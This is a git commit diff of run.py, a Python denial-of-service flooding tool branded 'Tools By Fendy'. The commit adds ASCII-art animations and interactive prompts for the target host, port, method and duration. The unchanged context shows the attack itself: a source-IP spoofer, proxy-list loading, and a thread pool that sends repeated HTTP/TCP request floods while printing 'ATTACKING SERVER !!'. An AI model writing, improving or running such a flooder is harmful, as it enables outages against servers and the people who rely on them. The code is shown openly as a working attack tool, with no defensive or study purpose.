9b5a5e203f08906079a0a3e73fd34fa1a90a21d8
F3ndy404 <136315742+F3ndy404@users.noreply.github.com>
2023-06-25 08:15:54 +0700

    Update run.py

--- run.py
+++ run.py
@@ -2,6 +2,7 @@ import random
 import socket
 import sys
 import time
+import os
 from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 
 def spoofer():
@@ -13,6 +14,90 @@ def spoofer():
     addr[3] = str(random.randrange(2, 254))
     assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assembled
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+def ascii_vro():
+    clear()
+    print(f'''
+     / **/|        
+     | == /        
+      |  |         
+      |  |         
+      |  /         
+       |/  
+
+
+
+
+
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+     / **/|        
+     | == /        
+      |  |         
+      |  |         
+      |  /         
+       |/  
+
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f'''
+
+
+
+
+
+
+
+     / **/|        
+     | == /        
+      |  |                  
+
+    ''')
+    time.sleep(0.6)
+    clear()
+    print(f"""
+
+     _.-^^---....,,--       
+ _--                  --_  
+<                        >)
+|                         | 
+ \._                   _./  
+    ```--. . , ; .--'''       
+          | |   |             
+       .-=||  | |=-.   
+       `-=#$%&%$#=-'   
+          | ;  :|     
+ _____.,-#%&$@%#&#~,._____
+    """)
+    time.sleep(0.8)
+    clear()
+
+
+def menu():
+	clear()
+print('''\033[97m
+▒█▀▀▀ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀▄ ▒█░░▒█ 
+▒█▀▀▀ ▒█▀▀▀ ▒█▒█▒█ ▒█░▒█ ▒█▄▄▄█ 
+▒█░░░ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄▀ ░░▒█░░
+\033[97mTools By Fendy
+''')
+
+ip = str(input("\033[91m===> [ ? ] HOST/IP :"))
+port = int(input("\033[91m===> [ ? ] PORT :"))
+method = str(input("\033[91m===> [ ? ] METHOD :"))
+duration = int(input("\033[91m===> [ ? ] DURATION :"))
 
 def ddos(ip, port, method, duration):
     try:
@@ -39,6 +124,9 @@ def ddos(ip, port, method, duration):
             s.connect((ip, port))
             while time.time() - start_time < duration:
                 s.sendall(request.encode())
+                print("\033[91m[ + ] ATTACKING SERVER !!")
+
+                
 
         if method == "TCP":
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,6 +134,7 @@ def ddos(ip, port, method, duration):
             s.connect((ip, port))
             while time.time() - start_time < duration:
                 s.sendall(request.encode())
+                print("\033[91m[ + ] ATTACKING SERVER !!")
 
     except ConnectionResetError:
         pass
@@ -65,21 +154,13 @@ if __name__ == "__main__":
 
     with open("https.txt", "r") as proxy_file:
         https = proxy_file.readlines()
-
-    if len(sys.argv) != 5:
-        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <method> <time>")
-        sys.exit(1)
-
-    ip = sys.argv[1]
-    port = int(sys.argv[2])
-    method = sys.argv[3]
-    duration = int(sys.argv[4])
-
+    
     threads = []
 
     with ThreadPoolExecutor(max_workers=100) as executor:
         for y in range(980005):
             executor.submit(ddos, ip, port, method, duration)
+
 
     time.sleep(duration)
     print(f"Attacks End {duration}s")
